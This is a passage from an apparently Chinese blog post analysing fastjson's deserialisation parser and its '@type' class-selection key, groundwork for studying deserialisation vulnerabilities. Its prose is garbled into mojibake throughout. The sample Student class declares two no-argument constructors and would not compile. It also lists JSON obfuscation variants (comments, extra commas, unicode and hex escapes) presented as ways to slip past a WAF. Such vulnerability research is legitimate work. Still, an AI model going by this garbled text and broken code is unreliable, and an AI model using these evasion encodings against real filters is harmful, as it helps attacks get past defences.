class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Studentæ— å‚æ„é€ å™¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p>ä¸‹é¢å°†ç”¨fastjsonæ¥åºåˆ—åŒ–ä¸Šé¢çš„å¯¹è±¡ï¼Œå°†ä»–ä»¬è½¬æ¢ä¸ºjson<br>æ–°å»ºä¸€ä¸ªæ–‡ä»¶StudentSer.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/1.jpg" alt><br>æ‰“å°äº†getAgeå’ŒgetNameï¼Œè¯´æ˜åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¯¹getXxxxè¿›è¡Œè°ƒç”¨<br>å½“ç„¶ä¸æ­¢toJSONStringï¼Œè¿˜æœ‰toJSONBytesï¼Œå…·ä½“å¯ä»¥çœ‹JSON.classç±»ä¸­çš„æˆå‘˜æ–¹æ³•</p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>æ¥ä¸‹æ¥å°±æ˜¯ååºåˆ—åŒ–äº†ï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–ç±»ä¼¼phpï¼Œå¹¶ä¸æ˜¯è¯»å–å­—èŠ‚æ–‡ä»¶ï¼Œè€Œæ˜¯è¯»å–jsonæ ¼å¼çš„å­—ç¬¦ä¸²<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">        System.out.printf(<span class="string">&quot;Parse had done =&gt; %s\n&quot;</span>,JSON.parse(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject(Student.class) has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson,Student.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/2.jpg" alt><br>åœ¨è¿™é‡Œè¿›è¡Œäº†ä¸‰æ¬¡ååºåˆ—åŒ–<br>ä¸»è¦å°±æ˜¯parseå’ŒparseObject<br>ä½†æ˜¯è§‚å¯ŸparseObjectçš„æºç ï¼Œå…¶å®ä¹Ÿæ˜¯å¯¹parseçš„ä¸€æ¬¡å°è£…ï¼Œæ ¸å¿ƒè¿˜æ˜¯è°ƒç”¨äº†parseï¼Œä¸»è¦åŒºåˆ«å°±æ˜¯å¯¹parseåè¿”å›çš„objè°ƒç”¨äº†ä¸€æ¬¡toJSONï¼Œè°ƒç”¨toJSONå°±ä¼šè°ƒç”¨ç±»ä¸­æ‰€æœ‰getï¼Œsetæ–¹æ³•<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œåªæœ‰æœ€åä¸€æ¬¡ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨äº†setXxxæ–¹æ³•ï¼Œå› ä¸ºæœ€åä¸€æ¬¡ä¼ é€’äº†ä¸€ä¸ªStudent.classç»™ä»–ï¼Œfastjsonæ‰èƒ½çŸ¥é“è¿™æ®µStringæœ€ååˆ°åº•åº”è¯¥ååºåˆ—åŒ–ä¸ºå“ªä¸ªå¯¹è±¡<br>è€Œä¸”ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨çš„æ„é€ å‡½æ•°æ˜¯æ— å‚æ„é€ å™¨ï¼Œæ‰€ä»¥fastjsonååºåˆ—åŒ–çš„JavaBeanå¿…é¡»æœ‰æ— å‚æ„é€ å™¨ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™</p><blockquote><p><strong>@type</strong><br>å¦‚æœæ¯æ¬¡éƒ½éœ€è¦ä¼ é€’å…·ä½“æ˜¯å“ªä¸ªç±»çš„ï¼Œå°±ä¼šæ˜¾å¾—è¿™ä¸ªååºåˆ—åŒ–å¾ˆç¬¨é‡ï¼Œæ‰€ä»¥å¼€å‘è€…ç»™å®šäº†ä¸€ä¸ª@typeçš„é”®ï¼Œå¯ä»¥åœ¨jsonå­—ç¬¦ä¸²é‡Œé¢æŒ‡å®šå…·ä½“è¦ååºåˆ—åŒ–ä¸ºå“ªä¸ªå¯¹è±¡<br><code>serJson = &quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>å¦‚æœæ˜¯å°†è¿™æ ·çš„jsonå­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼Œé‚£ä¹ˆä¸Šé¢çš„ä¸‰ç§ååºåˆ—åŒ–æ–¹å¼ä¹Ÿéƒ½å¯ä»¥æ­£ç¡®ååºåˆ—åŒ–<br>æ‰€ä»¥è¿™ä¸ªç‚¹ä¹Ÿæ˜¯åç»­æ¼æ´çš„æ ¸å¿ƒå…³é”®</p></blockquote><h2 id="ååºåˆ—åŒ–æºç åˆ†æ"><a href="#ååºåˆ—åŒ–æºç åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–æºç åˆ†æ"></a>ååºåˆ—åŒ–æºç åˆ†æ</h2><p><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/3.jpg" alt></p><h3 id="No1-DefaultJSONParser"><a href="#No1-DefaultJSONParser" class="headerlink" title="No1 DefaultJSONParser"></a>No1 DefaultJSONParser</h3><p>é¦–å…ˆä¼šè¿›å…¥è¿™é‡Œï¼Œnewäº†ä¸€ä¸ªDefaultJSONParserå¯¹è±¡<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/4.jpg" alt><br>è·Ÿè¿›å»ä¼šé¦–å…ˆåˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œå¦‚æœæ˜¯â€œ{â€ï¼Œå°±ä¼šå°†tokenè®¾ç½®ä¸º12ï¼Œå¦‚æœæ˜¯â€œ[â€ï¼Œå°±ä¼šè®¾ç½®14ï¼Œå¦‚æœéƒ½ä¸æ˜¯å°±ä¼šè¿›å…¥nextTokenï¼Œä¸»è¦ä½œç”¨å°±æ˜¯çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œå¦‚æœç¢°åˆ°äº†â€œ{â€å°±å°†tokenè®¾ç½®ä¸º12<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//éƒ¨åˆ†ä»£ç </span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="built_in">this</span>.token = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><br>å½“ç„¶è¿˜æœ‰å…¶å®ƒæƒ…å†µï¼Œæ¯”å¦‚ç¢°åˆ°ç©ºæ ¼ä¹‹ç±»çš„ï¼Œå°±ä¼šç»§ç»­è·³åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œç›´åˆ°ç¢°åˆ°åƒâ€œ{â€è¿™æ ·çš„å­—ç¬¦ï¼Œæœ‰æ—¶ç»•wafå¯èƒ½å°±ä¼šç”¨åˆ°è¿™äº›ç‰¹æ€§ï¼Œæ¯”å¦‚åœ¨jsonå‰é¢å¡«å……åƒåœ¾å­—ç¬¦<br><code>serJson = &quot;        &#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>å‰©ä¸‹çš„è¯»è€…å¯ä»¥è‡ªè¡Œåˆ†æ</p><blockquote><p><strong>å°æ’æ›²</strong><br>è¿™é‡Œæˆ‘å°†{}æ”¹æˆäº†[]ï¼Œç„¶åè¿›è¡Œäº†ååºåˆ—åŒ–<br><code>serJson = &quot;[\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;]&quot;;</code><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/5.jpg" alt><br>ä½†æ˜¯æŠ¥é”™äº†ï¼Œç»§ç»­fuzzï¼Œè¯•äº†ä¸€ä¸‹{å¼€å¤´ï¼Œ]ç»“å°¾<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/6.jpg" alt><br>è™½ç„¶æœ€åæŠ¥é”™äº†ï¼Œä½†æ˜¯å‰é¢ç¡®å®å¯ä»¥ååºåˆ—åŒ–ï¼Œè¯´ä¸å®šè¿™ç§å°±å¯ä»¥ç»•ä¸€ä¸‹waf</p></blockquote><p><em>æ³¨æ„ä¸Šé¢çš„æ“ä½œéƒ½æ˜¯åœ¨jsonå­—ç¬¦ä¸²ä¹‹å‰çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨â€œ{â€å‰é¢çš„ä¸€äº›æ£€æŸ¥ï¼Œæ¥ä¸‹æ¥å°±è¿›å…¥{}é‡Œé¢äº†</em></p><h3 id="No2-parseObject-gt-skipWhitespace"><a href="#No2-parseObject-gt-skipWhitespace" class="headerlink" title="No2 parseObject()-&gt;skipWhitespace()"></a>No2 parseObject()-&gt;skipWhitespace()</h3><p>èµ°å®ŒDefaultJSONParserçš„åˆå§‹åŒ–ï¼Œå°±è¿›å…¥åˆ°parser.parse()<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/7.jpg" alt><br>å› ä¸ºä¹‹å‰æ˜¯{ï¼Œæ‰€ä»¥è®¾ç½®çš„tokenä¸º12ï¼Œæ‰€ä»¥å°±ä¼šè¿›å…¥è¿™ä¸ªcase<br>ç”±äºå­—èŠ‚çš„åŸå› ï¼Œæˆ‘ä¸èƒ½åœ¨è¿™ä¸‹æ–­ç‚¹ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥å°†æ–­ç‚¹æ‰“åˆ°parseObjecté‡Œé¢<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/8.jpg" alt><br>ç›´æ¥è·³åˆ°è¿™ä¸ªå¾ªç¯å¤„<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/9.jpg" alt><br>ç¬¬ä¸€ä¸ªå‡½æ•°æ ¹æ®è‹±æ–‡æ„æ€skipWhitespaceï¼Œå¯ä»¥å¤§æ¦‚çŒœå‡ºæ˜¯è·³è¿‡ç©ºç™½å­—ç¬¦ä¸²<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.skipComment();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°å…·ä½“å®ç°ï¼Œä¸ä»…å¯ä»¥è·³è¿‡ç©ºæ ¼ï¼Œæ¢è¡Œä¹‹ç±»çš„ï¼Œè¿˜å¯ä»¥è·³è¿‡æ³¨é‡Šï¼ˆskipCommentï¼‰<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="number">26</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.next();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆå°±æ˜¯/*xxxx*/<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123; <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="comment">/**/&quot;<span class="doctag">@type</span>&quot;:&quot;Student&quot;&#125;</span></span><br><span class="line"><span class="comment">&#123;/*abcdef*/</span><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆè¿™å››ç§å…¶å®æ•ˆæœç›¸åŒï¼Œéƒ½å¯ä»¥è¾¾åˆ°ååºåˆ—åŒ–çš„ç›®çš„</p><h3 id="No3-parseObject-gt-AllowArbitraryCommas"><a href="#No3-parseObject-gt-AllowArbitraryCommas" class="headerlink" title="No3 parseObject()-&gt;AllowArbitraryCommas"></a>No3 parseObject()-&gt;AllowArbitraryCommas</h3><p>åœ¨èµ°å®Œä¸Šé¢çš„åˆ¤æ–­ä»¥åï¼Œæ¥ä¸‹æ¥å°±æ˜¯<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/10.jpg" alt><br>åŒæ ·ï¼Œæ ¹æ®å­—é¢æ„æ€å’Œä»£ç ï¼Œå¤§æ¦‚æ¨æ–­å°±æ˜¯åˆ¤æ–­æœ‰æ²¡æœ‰é€—å·ï¼Œå¦‚æœæœ‰å°±è·³è¿‡<br>ä¹Ÿå°±æ˜¯<code>&#123;,,,,&quot;@type&quot;:&quot;Student&quot;&#125;</code>ï¼Œä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ­£å¸¸ååºåˆ—åŒ–çš„</p><h3 id="No4-parseObject-gt-scanSymbol"><a href="#No4-parseObject-gt-scanSymbol" class="headerlink" title="No4 parseObject()-&gt;scanSymbol()"></a>No4 parseObject()-&gt;scanSymbol()</h3><p>ç»§ç»­å¾€ä¸‹èµ°<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/11.jpg" alt><br>å› ä¸ºèµ°å®Œå‰é¢çš„ä¸€ç³»åˆ—æ“ä½œï¼Œé‚£ä¹ˆå½“å‰çš„å­—ç¬¦å°±æ˜¯@typeä¹‹å‰çš„åŒå¼•å·äº†<br>è¿™é‡Œçš„scanSymbolå¾ˆé‡è¦ï¼Œä¸»è¦å°±æ˜¯æ‰«æåˆ°ä¸‹ä¸€ä¸ªåŒå¼•å·å‡ºç°ä¹‹å‰çš„å­—ç¬¦ä¸²ï¼Œåœ¨è¿™å°±æ˜¯@type<br>å…¶ä¸­æœ‰å‡ æ®µæ¯”è¾ƒé‡è¦çš„ç‰¹æ€§ï¼Œæˆ‘è¿™æˆªå–äº†éƒ¨åˆ†ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">    chLocal = <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">switch</span>(chLocal) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]&#123;c1, c2, c3, c4&#125;), <span class="number">16</span>);</span><br><span class="line">            hash = <span class="number">31</span> * hash + val;</span><br><span class="line">            <span class="built_in">this</span>.putChar((<span class="type">char</span>)val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">            <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>)x_val;</span><br><span class="line">            hash = <span class="number">31</span> * hash + x_char;</span><br><span class="line">            <span class="built_in">this</span>.putChar(x_char);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯å½“é‡è§æ–œæ ï¼Œé‚£ä¹ˆå°±çœ‹æ–œæ åé¢ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ä»€ä¹ˆ<br>å¦‚æœæ˜¯ué‚£å°±è¯»å–uåé¢4ä½ï¼Œå½“ä½œunicodeè§£ç <br>åŒç†å¦‚æœæ˜¯xå°±å½“ä½œåå…­è¿›åˆ¶è§£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79\x70\x65&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸Šé¢5ä¸ªjsonæ˜¯ç­‰ä»·çš„ï¼Œéƒ½å¯ä»¥æ­£å¸¸è¿›è¡Œååºåˆ—åŒ–</p><h3 id="No5-parseObject-gt-TypeUtils-loadClass"><a href="#No5-parseObject-gt-TypeUtils-loadClass" class="headerlink" title="No5 parseObject()-&gt;TypeUtils.loadClass()"></a>No5 parseObject()-&gt;TypeUtils.loadClass()</h3><p>æå–å®Œäº†@typeè¿™ä¸ªé”®çš„å­—ç¬¦ä¸²ä»¥åï¼Œå°±è¦è§£æé”®å€¼äº†ï¼Œåœ¨è¿™é‡Œå°±æ˜¯Student<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/12.jpg" alt><br>å¯ä»¥çœ‹åˆ°åŒæ ·ç”¨åˆ°äº†scanSymbolï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„ç±»åä¹Ÿå¯ä»¥ç”¨åå…­è¿›åˆ¶å’Œunicodeå»ç¼–ç <br><code>&#123;&quot;\x40\x74\x79pe&quot;:&quot;\u0053\u0074\u0075dent&quot;&#125;</code><br>æ¥ç€å°±è¿›å…¥åˆ°äº†loadClassäº†ï¼ŒåŠ¨æ€åŠ è½½ç±»<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/13.jpg" 